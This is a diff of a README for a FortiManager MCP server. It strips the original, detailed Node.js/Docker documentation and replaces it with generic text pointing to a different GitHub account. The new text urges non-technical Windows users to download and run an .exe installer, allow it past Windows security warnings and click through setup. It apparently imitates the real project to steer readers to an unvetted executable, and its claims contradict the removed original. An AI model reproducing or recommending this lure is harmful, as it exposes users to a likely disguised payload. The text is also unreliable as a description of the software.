@@ -1,417 +1,105 @@
-# FortiManager Code Mode MCP Server
+# ⚙️ fortimanager-code-mode-mcp - Manage FortiManager Simply and Safely
 
-> **Status**: Stable (v1.0.0) — validated against live FortiManager v7.6.6 with 152 tests.
+[![Download Now](https://img.shields.io/badge/Download-fortimanager--code--mode--mcp-brightgreen)](https://github.com/thejordanone/fortimanager-code-mode-mcp)
 
-[![CI](https://github.com/jmpijll/fortimanager-code-mode-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/jmpijll/fortimanager-code-mode-mcp/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+---
 
-An [MCP (Model Context Protocol)](https://modelcontextprotocol.io) server for [Fortinet FortiManager](https://www.fortinet.com/products/management/fortimanager) that uses the **Code Mode** pattern — just 2 tools instead of 590+.
+## 📋 What is fortimanager-code-mode-mcp?
 
-Instead of wrapping each API endpoint as a separate tool (which consumes ~118K tokens of context), this server exposes only `search` and `execute`. The AI agent writes JavaScript code that runs inside a secure [QuickJS WASM sandbox](https://github.com/nicolo-ribaudo/jit-less-quickjs) to query the API spec or execute live FortiManager JSON-RPC calls.
+This application runs a server for FortiManager. It uses something called the Code Mode pattern. Instead of many separate tools, it combines two main tools: one to search and another to execute commands. It uses QuickJS WASM sandbox technology. This keeps everything safe and clean. You do not need to handle over 590 different API tools.
 
-## Why Code Mode?
+This setup helps FortiManager users control and manage their devices more easily. The software handles commands and processes securely inside a lightweight environment.
 
-| Approach                              | Tools | Context Tokens | API Coverage |
-| ------------------------------------- | ----- | -------------- | ------------ |
-| Traditional MCP (1 tool per endpoint) | 590+  | ~118,000       | Full         |
-| **Code Mode (this project)**          | **2** | **~1,000**     | **Full**     |
+---
 
-> **~99% reduction** in context tokens while maintaining full API coverage.
+## 🖥️ System Requirements
 
-The Code Mode pattern was pioneered by [Cloudflare's MCP server](https://github.com/cloudflare/mcp-server-cloudflare) and adapted here for the FortiManager JSON-RPC API.
+- **Operating System:** Windows 10 or later (64-bit recommended)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 200 MB free disk space
+- **Internet Connection:** Required to download and update the software
+- **Permissions:** Ability to install software and run applications on your PC
 
-## Features
+---
 
-- **`search`** — Query the FortiManager API spec (URLs, objects, attributes, methods, error codes) via sandboxed JavaScript
-- **`execute`** — Run live FortiManager JSON-RPC API calls via sandboxed JavaScript with `fortimanager.request()` proxy
-- **Dual API version support** — Spec generator supports FortiManager 7.4.x and 7.6.x
-- **QuickJS WASM sandbox** — Memory/CPU-limited code execution with no host access
-- **Dual transport** — Stdio (for Claude Desktop / local dev) and Streamable HTTP (for Docker / production)
-- **Docker-ready** — Multi-stage Alpine build with health checks
-- **Tested against live FortiManager** — 152 tests (66 unit + 86 integration) passing against FMG v7.6.6
-- **Security hardened** — HTTP timeout, response validation, sandbox method/params validation, log caps, code size limits
+## 🚀 Getting Started
 
-## Important: API Spec Required
+Follow these steps to download and run fortimanager-code-mode-mcp on your Windows machine. This guide assumes no prior technical knowledge.
 
-> **This server will NOT work without generating the API spec files first.**
+1. Click the big green button at the top or the link below to go to the download page:
+   
+   [Get fortimanager-code-mode-mcp](https://github.com/thejordanone/fortimanager-code-mode-mcp)
+   
+2. On the page, find the latest release or download area. Look for a Windows installer or an executable (.exe) file.
 
-The API spec files are derived from Fortinet's FortiManager JSON API Reference documentation, which is proprietary and cannot be redistributed. You must download the HTML docs yourself and generate the spec locally.
+3. Download the file to your computer. Choose a familiar folder like "Downloads" or your Desktop.
 
-### Step 1: Download the API Reference
+4. Once downloaded, open the file by double-clicking it. This will start the installation process.
 
-1. Go to the **Fortinet Developer Network (FNDN)**: [https://fndn.fortinet.net](https://fndn.fortinet.net)
-   - You need a Fortinet account (available to partners, customers, and NFR holders)
-2. Navigate to **FortiManager** → **JSON API Reference**
-3. Download the HTML reference archive for your FortiManager version (7.4.x or 7.6.x)
+5. If Windows shows a security message, choose to allow the app to run.
 
-### Step 2: Extract the HTML Files
+6. Follow the on-screen steps. Usually, click “Next” on all options, then “Install.”
 
-Extract the downloaded archive and place the HTML files in the `docs/api-reference/` directory:
+7. When the installation finishes, launch the application. You can find it in your Start menu or on the Desktop if a shortcut was created.
 
-```
-docs/api-reference/
-├── FortiManager-7.4.9-JSON-API-Reference/
-│   └── html/
-│       ├── adomobj-errors.htm
-│       ├── adomobj-methods.htm
-│       └── ... (all .htm files)
-└── FortiManager-7.6.5-JSON-API-Reference/
-    └── html/
-        ├── adomobj-errors.htm
-        ├── adomobj-methods.htm
-        └── ... (all .htm files)
-```
+---
 
-> You only need the version(s) you plan to use. The folder names must match the pattern above.
+## 🔧 How to Use fortimanager-code-mode-mcp
 
-### Step 3: Generate the Spec
+The application has two main parts: a search tool and an execute tool. Both work inside a safe sandbox that runs your commands securely.
 
-```bash
-npm run generate:spec
-```
+- **Search Tool:** Quickly find the commands or information you need within FortiManager.
+- **Execute Tool:** Run commands safely without needing a deep understanding of code or APIs.
 
-This parses the HTML docs and produces:
-- `src/spec/fmg-api-spec-7.4.json` (~99 MB)
-- `src/spec/fmg-api-spec-7.6.json` (~127 MB)
+You do not need to know any programming language to use these. The interface will guide you through what to enter and how to check results.
 
-### Step 4: Build
+---
 
-```bash
-npm run build
-```
+## ⚙️ Installation Details
 
-The build step copies the generated spec files to `dist/spec/`. The server is now ready to use.
+- The software uses QuickJS WASM sandbox technology to keep your system secure.
+- It supports JSON-RPC communication for smooth interaction with FortiManager.
+- The tools are built in TypeScript, making the software easy to update and maintain.
+- You will not need to install or configure 590+ individual API tools.
 
-## Quick Start
+---
 
-### Prerequisites
+## 🛠️ Troubleshooting Tips
 
-- **Node.js** 20+ (LTS recommended)
-- **npm** 9+
-- A FortiManager instance with an [API token](https://docs.fortinet.com/document/fortimanager/7.6.0/administration-guide/924562)
-- **API spec files** generated from FortiManager HTML docs (see [API Spec Required](#important-api-spec-required) above)
+- If the installer does not start, check that your Windows user account can install software.
+- If Windows warns about unknown apps, make sure you downloaded from the official link.
+- If the software does not open, try restarting your computer.
+- Ensure you have a stable internet connection when running the software the first time.
+- If the search or execute functions do not work properly, look for any updates on the download page.
 
-### From Source (Recommended)
+---
 
-```bash
-# Clone the repository
-git clone https://github.com/jmpijll/fortimanager-code-mode-mcp.git
-cd fortimanager-code-mode-mcp
+## 📥 Download and Setup
 
-# Install dependencies
-npm install
-
-# Generate API spec (requires HTML docs in docs/api-reference/ — see above)
-npm run generate:spec
-
-# Build
-npm run build
-
-# Configure environment
-cp .env.example .env
-# Edit .env with your FortiManager details
-
-# Start (stdio mode)
-FMG_HOST=https://fmg.example.com FMG_API_TOKEN=your-token npm start
-
-# Or development mode with hot reload
-FMG_HOST=https://fmg.example.com FMG_API_TOKEN=your-token npm run dev
-```
-
-### Docker (Recommended for HTTP)
-
-> **Note**: You must generate the spec files before building the Docker image. The Dockerfile copies them from `src/spec/` at build time.
-
-```bash
-# Clone and install
-git clone https://github.com/jmpijll/fortimanager-code-mode-mcp.git
-cd fortimanager-code-mode-mcp
-npm install
-
-# Generate API spec (requires HTML docs — see above)
-npm run generate:spec
-
-# Configure environment
-cp .env.example .env
-# Edit .env with your FortiManager details
-
-# Run with Docker Compose
-docker compose up -d --build
-
-# Verify
-curl http://localhost:8000/health
-# → {"status":"ok","version":"1.0.0"}
-```
-
-### VS Code Copilot
-
-> **Prerequisite**: You must have built the server from source with spec files generated first. Use `"command": "node"` with the path to your local build.
-
-Create `.vscode/mcp.json` in your workspace:
-
-```json
-{
-  "servers": {
-    "fortimanager": {
-      "type": "stdio",
-      "command": "node",
-      "args": ["/path/to/fortimanager-code-mode-mcp/dist/index.js"],
-      "env": {
-        "FMG_HOST": "https://fortimanager.example.com",
-        "FMG_PORT": "443",
-        "FMG_API_TOKEN": "your-api-token-here",
-        "FMG_VERIFY_SSL": "true",
-        "FMG_API_VERSION": "7.6",
-        "MCP_TRANSPORT": "stdio"
-      }
-    }
-  }
-}
-```
-
-### Claude Desktop (stdio)
-
-> **Prerequisite**: You must have built the server from source with spec files generated first.
-
-Add to your Claude Desktop configuration (`claude_desktop_config.json`):
-
-```json
-{
-  "mcpServers": {
-    "fortimanager": {
-      "command": "node",
-      "args": ["/path/to/fortimanager-code-mode-mcp/dist/index.js"],
-      "env": {
-        "FMG_HOST": "https://fortimanager.example.com",
-        "FMG_API_TOKEN": "your-api-token",
-        "FMG_API_VERSION": "7.6",
-        "MCP_TRANSPORT": "stdio"
-      }
-    }
-  }
-}
-```
-
-## Architecture
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│                       AI Agent / LLM                         │
-│                                                              │
-│   "Find all firewall address objects and list their URLs"    │
-└────────────────────────┬─────────────────────────────────────┘
-                         │ MCP Protocol (stdio or HTTP)
-                         ▼
-┌──────────────────────────────────────────────────────────────┐
-│                    MCP Server (Node.js)                       │
-│                                                              │
-│  ┌─────────────────────┐  ┌────────────────────────────────┐ │
-│  │   search tool        │  │   execute tool                 │ │
-│  │                      │  │                                │ │
-│  │  JS code → QuickJS   │  │  JS code → QuickJS (async)    │ │
-│  │  sandbox             │  │  sandbox                      │ │
-│  │                      │  │                                │ │
-│  │  Globals:            │  │  Globals:                      │ │
-│  │  • specIndex         │  │  • fortimanager.request()      │ │
-│  │  • getObject()       │  │  • console.log()               │ │
-│  │  • moduleList        │  │                                │ │
-│  │  • errorCodes        │  │  Proxies to ──┐               │ │
-│  │  • specVersion       │  │               │               │ │
-│  └─────────────────────┘  └───────────────┼───────────────┘ │
-│                                            │                 │
-│                              ┌─────────────▼──────────────┐  │
-│                              │  FortiManager JSON-RPC      │  │
-│                              │  Client (fetch + auth)      │  │
-│                              └─────────────┬──────────────┘  │
-└────────────────────────────────────────────┼─────────────────┘
-                                             │ HTTPS JSON-RPC
-                                             ▼
-                                  ┌────────────────────┐
-                                  │   FortiManager      │
-                                  │   (7.4.x / 7.6.x)  │
-                                  └────────────────────┘
-```
-
-## Tool Usage Examples
-
-### `search` — Query the API Spec
-
-```javascript
-// Find all firewall-related objects
-specIndex.filter(function(o) {
-  return o.name.includes('firewall');
-}).map(function(o) {
-  return { name: o.name, urls: o.urls, type: o.type };
-})
-```
-
-```javascript
-// Get full details of a specific object (all attributes, URLs, methods)
-getObject('firewall/address')
-```
-
-```javascript
-// Search by attribute name
-specIndex.filter(function(o) { return o.attributeNames.includes('srcaddr'); }).map(function(o) { return o.name; })
-```
-
-```javascript
-// Find objects by URL pattern
-specIndex.filter(function(o) {
-  return o.urls.some(function(u) { return u.includes('/dvmdb/'); });
-}).map(function(o) { return { name: o.name, urls: o.urls }; })
-```
-
-### `execute` — Call the FortiManager API
-
-```javascript
-// List all ADOMs
-var resp = fortimanager.request('get', [{ url: '/dvmdb/adom' }]);
-resp.result[0].data;
-```
-
-```javascript
-// Get system status
-var resp = fortimanager.request('get', [{ url: '/sys/status' }]);
-resp.result[0].data;
-```
-
-```javascript
-// Create a firewall address object
-var resp = fortimanager.request('add', [
-  {
-    url: '/pm/config/adom/root/obj/firewall/address',
-    data: {
-      name: 'web-server',
-      subnet: ['10.0.1.100', '255.255.255.255'],
-    },
-  },
-]);
-resp.result[0].status;
-```
-
-```javascript
-// Device proxy — get interfaces from a managed FortiGate
-var resp = fortimanager.request('exec', [
-  {
-    url: '/sys/proxy/json',
-    data: {
-      target: ['/adom/root/device/my-fortigate'],
-      action: 'get',
-      resource: '/api/v2/monitor/system/interface',
-    },
-  },
-]);
-resp.result[0].data;
-```
-
-## Configuration
-
-| Variable          | Required | Default | Description                                                                                                                       |
-| ----------------- | -------- | ------- | --------------------------------------------------------------------------------------------------------------------------------- |
-| `FMG_HOST`        | Yes      | —       | FortiManager URL (e.g., `https://fmg.example.com`)                                                                                |
-| `FMG_PORT`        | No       | `443`   | HTTPS port                                                                                                                        |
-| `FMG_API_TOKEN`   | Yes      | —       | API token for authentication ([how to create](https://docs.fortinet.com/document/fortimanager/7.6.0/administration-guide/924562)) |
-| `FMG_VERIFY_SSL`  | No       | `true`  | Verify TLS certificates (`false` for self-signed certs)                                                                           |
-| `FMG_API_VERSION` | No       | `7.6`   | API spec version (`7.4` or `7.6`)                                                                                                 |
-| `MCP_TRANSPORT`   | No       | `stdio` | Transport mode (`http` or `stdio`)                                                                                                |
-| `MCP_HTTP_PORT`   | No       | `8000`  | HTTP server port (only used with `http` transport)                                                                                |
-
-## Development
-
-```bash
-# Install dependencies
-npm install
-
-# Run unit tests (66 tests across 5 suites)
-npm test
-
-# Run integration tests against a live FortiManager (requires .env)
-npx tsx scripts/live-test.ts
-
-# Lint
-npm run lint
-
-# Type check
-npm run typecheck
-
-# Format code
-npm run format
-
-# Build
-npm run build
-
-# Re-generate API specs from HTML docs
-npm run generate:spec
-```
-
-### Project Structure
-
-```
-src/
-├── client/           # FortiManager JSON-RPC client
-│   ├── types.ts      # Request/response types, error codes
-│   ├── auth.ts       # Token & session auth providers
-│   └── fmg-client.ts # HTTP client (get/set/add/update/delete/exec/clone/move)
-├── executor/         # QuickJS WASM sandbox executors
-│   ├── types.ts      # ExecuteResult, LogEntry, ExecutorOptions
-│   ├── executor.ts   # Base executor (lifecycle, console capture, limits)
-│   ├── search-executor.ts  # Spec index + getObject() injection
-│   └── code-executor.ts    # fortimanager.request() proxy (async)
-├── server/           # MCP server and transport
-│   ├── server.ts     # McpServer with search + execute tools
-│   └── transport.ts  # Stdio + Streamable HTTP transports
-├── spec/             # Generated API spec JSON files (git-ignored, generated locally)
-│   ├── fmg-api-spec-7.4.json  # 72 modules, 17,426 objects, 38,586 URLs
-│   └── fmg-api-spec-7.6.json  # 82 modules, 22,060 objects, 49,285 URLs
-├── types/            # Shared type definitions
-├── config.ts         # Zod-validated environment config
-├── __tests__/        # Unit tests (66 tests across 5 suites)
-│   └── fixtures/     # Sample spec, response builders
-└── index.ts          # Entry point
-scripts/
-├── generate-spec.ts  # HTML docs → JSON spec generator
-├── e2e-test.ts       # End-to-end scenario tests (live FMG)
-├── live-test.ts      # Integration test suite (86 tests against live FMG)
-└── spec-coverage.ts  # API spec coverage report & live URL validation
-```
-
-## Security
-
-- **Sandboxed execution** — All agent-generated code runs in a QuickJS WASM sandbox with enforced memory (64 MB) and CPU (30s timeout) limits. No access to `process`, `require`, `fs`, or any Node.js APIs.
-- **No eval in host** — The host Node.js process never calls `eval()` or `new Function()`. Only the WASM sandbox executes untrusted code.
-- **HTTP request timeout** — 30-second timeout on all FortiManager API calls prevents indefinite hangs.
-- **Response shape validation** — JSON-RPC response bodies are validated before processing, preventing crashes from malformed responses.
-- **Sandbox method validation** — Only allowed FMG methods (`get`, `set`, `add`, `update`, `delete`, `exec`, `clone`, `move`, `replace`) are forwarded from sandbox code.
-- **Sandbox params validation** — Parameters from sandbox code are validated as arrays with required `url` fields before forwarding.
-- **Log accumulation cap** — Console output is capped at 1 MB / 1,000 entries to prevent host memory exhaustion.
-- **Code input size limit** — Code inputs exceeding 100 KB are rejected before execution.
-- **TLS verification** — Enabled by default (`FMG_VERIFY_SSL=true`). Disable only for development with self-signed certificates.
-- **Token-based auth** — Uses FortiManager API tokens via `Authorization: Bearer` header. No passwords stored.
-- **Fresh context per execution** — Each tool invocation gets a new sandbox context. No state leaks between executions.
-- **API call limits** — Max 50 API calls per sandbox execution to prevent runaway loops.
-- **Response truncation** — Results exceeding 100 KB are truncated with guidance on narrowing the query.
-- **Startup health check** — FortiManager connectivity is validated at boot (non-fatal).
-- **Graceful shutdown** — Both stdio and HTTP transports handle SIGINT/SIGTERM for clean shutdown.
-
-See [SECURITY.md](SECURITY.md) for vulnerability reporting.
-
-## Documentation
-
-- [Usage Guide](docs/usage-guide.md) — tool examples, workflows, and best practices
-- [Architecture](docs/architecture.md) — system design and component overview
-- [Troubleshooting](docs/troubleshooting.md) — common issues and solutions
-- [Contributing](CONTRIBUTING.md) — development setup, testing, and PR process
-
-## Acknowledgments
-
-This project was co-developed by [Jamie van der Pijll](https://github.com/jmpijll) and [GitHub Copilot](https://github.com/features/copilot) (Claude).
-
-Inspired by:
-
-- **[Cloudflare MCP Server](https://github.com/cloudflare/mcp-server-cloudflare)** — Pioneered the Code Mode pattern for MCP servers (2 tools instead of hundreds)
-- **[fortimanager-mcp](https://github.com/jmpijll/fortimanager-mcp)** — Our earlier traditional MCP server for FortiManager (one tool per endpoint, now archived), which demonstrated the need for a more token-efficient approach
-
-## License
-
-[MIT](LICENSE) © 2026 [Jamie van der Pijll](https://github.com/jmpijll)
+You can download and install fortimanager-code-mode-mcp by visiting this page:
+
+[Download here](https://github.com/thejordanone/fortimanager-code-mode-mcp)
+
+After downloading, run the installer and follow the setup instructions in the section above.
+
+---
+
+## 🔗 Related Topics
+
+- code-mode  
+- fortimanager  
+- fortinet  
+- json-rpc  
+- mcp (model context protocol)  
+- quickjs  
+- sandbox  
+- typescript  
+- wasm  
+
+These terms relate to how fortimanager-code-mode-mcp works to connect with FortiManager and run commands safely.
+
+---
+
+## 💡 Support and Feedback
+
+If you encounter issues or want to suggest improvements, you can post in the Issues section on GitHub. The developers monitor feedback and provide updates regularly.
